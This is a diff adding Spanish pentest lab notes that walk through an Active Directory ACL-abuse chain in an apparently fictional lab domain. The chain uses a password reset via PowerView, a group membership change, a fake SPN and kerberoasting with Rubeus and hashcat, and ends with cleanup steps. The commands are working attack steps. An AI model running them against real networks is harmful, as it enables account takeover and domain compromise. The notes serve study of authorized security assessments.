@@ -1,0 +1,60 @@
+Ejemplo de vector de ataque abusando de las ACL:
+
+Resultado de la enumeración:
+
+We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. 
+Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. 
+We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attack, 
+which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to 
+Domain/Enterprise Admin and even achieve persistence.
+
+1)Use the wley user to change the password for the damundsen user
+2)Authenticate as the damundsen user and leverage GenericAll rights to add a user that we control to the Help Desk Level 1 group
+3)Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
+
+Ataque:
+1)Nos autenticamos como wley (si no lo hicimos logueandonos directamente, podemos generar credenciales en la powershell):
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+Creamos un securestring object que prepresenta el password que queremos dar al usuario damundsen
+ $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+Luego por medio de powerview cambiamos el password del user:
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+
+2)ahora creamos credenciales para el usuario damundsen
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+
+
+Luego nos agregamos al grupo help desk 1
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+Podemos confirmarlo con el siguiente comando:
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+3)Si el usuario adunn es un admin y no debe ser molestado (porque el engagement lo dice) podemos modificar el SPN de la cuenta 
+para crear un SPN falso para poder hacerle kerberoasting.
+Podemos usar Set-DomainObject para crearlo.
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+Luego podemos hacer kerberoasting con rubeus para obener el hash y luego intentar romperlo con hascat:
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+hashcat -m 13100 <file.hash> <dictionary>
+
+Luego deberemos limpiar nuestros pasos:
+1)Remover el SPN falso.
+2)Remover damundsen del grupo help desk level 1
+3)Devolver el password de damundsen a su original valor (si lo sabemos, sino vamos a tener que avisarle al cliente)
+
+1) removemos el falso SPN:
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+2)Removemos el user del grupo help desk 1:
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+
+
+
